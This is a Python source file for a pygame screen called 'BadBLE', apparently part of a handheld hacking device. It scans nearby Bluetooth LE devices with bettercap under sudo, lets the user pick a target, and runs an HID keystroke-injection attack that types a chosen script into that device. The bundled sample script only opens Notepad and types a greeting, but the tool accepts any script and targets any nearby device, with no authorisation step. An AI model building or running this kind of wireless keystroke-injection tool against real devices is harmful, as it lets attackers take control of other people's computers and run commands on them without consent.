"""BadBLE screen — HID injection and automated pairing using Bettercap."""
from __future__ import annotations

import os
import subprocess
import threading
import time
import re
from pathlib import Path

import pygame

from . import Screen
from .. import config

PHASE_SCAN = "scan"
PHASE_SCRIPTS = "scripts"
PHASE_ATTACK = "attack"

class BadBLEScreen(Screen):
    def __init__(self, app):
        super().__init__(app)
        self.phase = PHASE_SCAN
        self.devices = []
        self.cursor = 0
        self.scripts = []
        self.script_cursor = 0
        self.selected_target = None
        self.selected_script = None
        
        self.status = "IDLE"
        self.error_msg = ""
        self.log = []
        
        self.script_dir = Path("loot/blescripts")
        self.script_dir.mkdir(parents=True, exist_ok=True)
        self._ensure_sample_script()
        
        self._stop_event = threading.Event()
        self._proc = None
        self._scan_thread = None
        
        self._start_scan()

    def _ensure_sample_script(self):
        sample = self.script_dir / "hello.txt"
        if not sample.exists():
            with open(sample, "w") as f:
                f.write("GUI r\nDELAY 500\nSTRING notepad.exe\nENTER\nDELAY 1000\nSTRING Hello from NeoBoX BadBLE!\nENTER\n")

    def on_action(self, action: str):
        if action == "B":
            if self.phase == PHASE_SCAN:
                self._stop_all()
                self.app.pop()
            elif self.phase == PHASE_SCRIPTS:
                self.phase = PHASE_SCAN
            elif self.phase == PHASE_ATTACK:
                self._stop_all()
                self.phase = PHASE_SCAN

        elif action == "UP":
            if self.phase == PHASE_SCAN and self.devices:
                self.cursor = (self.cursor - 1) % len(self.devices)
            elif self.phase == PHASE_SCRIPTS and self.scripts:
                self.script_cursor = (self.script_cursor - 1) % len(self.scripts)

        elif action == "DOWN":
            if self.phase == PHASE_SCAN and self.devices:
                self.cursor = (self.cursor + 1) % len(self.devices)
            elif self.phase == PHASE_SCRIPTS and self.scripts:
                self.script_cursor = (self.script_cursor + 1) % len(self.scripts)

        elif action == "A":
            if self.phase == PHASE_SCAN and self.devices:
                self.selected_target = self.devices[self.cursor]
                self._load_scripts()
                self.phase = PHASE_SCRIPTS
            elif self.phase == PHASE_SCRIPTS and self.scripts:
                self.selected_script = self.scripts[self.script_cursor]
                self._start_attack()
                self.phase = PHASE_ATTACK
            elif self.phase == PHASE_ATTACK:
                pass # Already running

        elif action == "X": # Rescan
            if self.phase == PHASE_SCAN:
                self._start_scan()

    def _start_scan(self):
        self.devices = []
        self.cursor = 0
        self.status = "SCANNING..."
        self._stop_all()
        self._stop_event.clear()
        self._scan_thread = threading.Thread(target=self._scan_loop, daemon=True)
        self._scan_thread.start()

    def _scan_loop(self):
        # We use bettercap in non-interactive mode to grab devices
        # ble.recon on; ble.show; q
        cmd = ["sudo", "bettercap", "-eval", "ble.recon on; sleep 5; ble.show; q", "-no-colors"]
        try:
            out = subprocess.check_output(cmd).decode()
            # Parse table: | 5c:c5:d4:61:52:6a | -68 dBm | ... | Name |
            found = []
            for line in out.splitlines():
                m = re.search(r"([0-9a-fA-F:]{17})\s+\|\s+-\d+\s+dBm\s+\|\s+.*\|\s+(.*)\s+\|", line)
                if m:
                    mac, name = m.group(1), m.group(2).strip()
                    if not name or name == "<null>": name = "Unknown"
                    found.append({"mac": mac, "name": name})
            self.devices = found
            self.status = f"FOUND {len(found)} DEVICES"
        except Exception as e:
            self.error_msg = str(e)
            self.status = "SCAN FAILED"

    def _load_scripts(self):
        self.scripts = sorted([f for f in self.script_dir.glob("*.txt")])
        self.script_cursor = 0

    def _start_attack(self):
        self.status = "ATTACKING..."
        self.log = [f"Target: {self.selected_target['name']}", f"Script: {self.selected_script.name}"]
        threading.Thread(target=self._attack_loop, daemon=True).start()

    def _attack_loop(self):
        # bettercap command for BadBLE HID injection
        # ble.recon on; ble.enum <mac>; ble.hid.inject <mac> <script>
        mac = self.selected_target["mac"]
        script_path = str(self.selected_script.absolute())
        
        cmd = [
            "sudo", "bettercap", 
            "-eval", f"ble.recon on; ble.enum {mac}; ble.hid.inject {mac} {script_path}; sleep 5; q",
            "-no-colors"
        ]
        try:
            self.log.append("Initializing HID...")
            self._proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in self._proc.stdout:
                if line.strip():
                    self.log.append(line.strip()[:40])
                    if len(self.log) > 10: self.log.pop(0)
            self.status = "ATTACK COMPLETE"
        except Exception as e:
            self.error_msg = str(e)
            self.status = "ATTACK FAILED"

    def _stop_all(self):
        self._stop_event.set()
        if self._proc:
            self._proc.terminate()
            self._proc = None

    def update(self, dt: float):
        pass

    def is_animating(self):
        return "..." in self.status

    def draw(self, surf, theme):
        self.app.draw_wallpaper(surf, theme)
        self.app.statusbar.draw(surf, theme, "BT: BAD_BLE")

        font = theme.font("ui")
        small = theme.font("small")
        accent = theme.color("accent")
        
        # Status
        status_rect = pygame.Rect(10, 40, config.SCREEN_W - 20, 50)
        pygame.draw.rect(surf, theme.color("tile"), status_rect, border_radius=8)
        pygame.draw.rect(surf, accent, status_rect, width=1, border_radius=8)
        
        surf.blit(font.render(self.status, True, accent), (status_rect.x + 15, status_rect.y + 12))
        
        if self.error_msg:
            surf.blit(small.render(f"ERR: {self.error_msg[:45]}", True, theme.color("danger")), (15, 95))

        area = pygame.Rect(10, 100, config.SCREEN_W - 20, config.SCREEN_H - 135)
        
        if self.phase == PHASE_SCAN:
            self._draw_list(surf, area, theme, self.devices, self.cursor, "mac", "name")
        elif self.phase == PHASE_SCRIPTS:
            self._draw_list(surf, area, theme, self.scripts, self.script_cursor, None, "name")
        elif self.phase == PHASE_ATTACK:
            y = area.y
            for line in self.log:
                surf.blit(small.render(line, True, theme.color("text")), (area.x + 5, y))
                y += 18

    def _draw_list(self, surf, area, theme, items, cursor, key_small, key_main):
        if not items:
            txt = theme.font("ui").render("NO ITEMS FOUND", True, theme.color("text_dim"))
            surf.blit(txt, txt.get_rect(center=area.center))
            return

        row_h = 24
        for i, item in enumerate(items):
            y = area.y + i * row_h
            if y > area.bottom - row_h: break
            sel = (i == cursor)
            if sel:
                pygame.draw.rect(surf, theme.color("tile_sel"), (area.x, y, area.width, row_h), border_radius=4)
                pygame.draw.rect(surf, theme.color("accent"), (area.x, y, area.width, row_h), width=1, border_radius=4)
            
            main_text = getattr(item, key_main) if hasattr(item, key_main) else (item.get(key_main) if isinstance(item, dict) else str(item.name))
            surf.blit(theme.font("ui").render(main_text[:25], True, theme.color("text")), (area.x + 5, y + 2))
            
            if key_small:
                sub_text = item.get(key_small)
                surf.blit(theme.font("small").render(sub_text, True, theme.color("text_dim")), (area.right - 140, y + 5))

    def hints(self):
        h = [("B", "back")]
        if self.phase == PHASE_SCAN:
            h += [("A", "select"), ("X", "rescan")]
        elif self.phase == PHASE_SCRIPTS:
            h += [("A", "inject")]
        return h
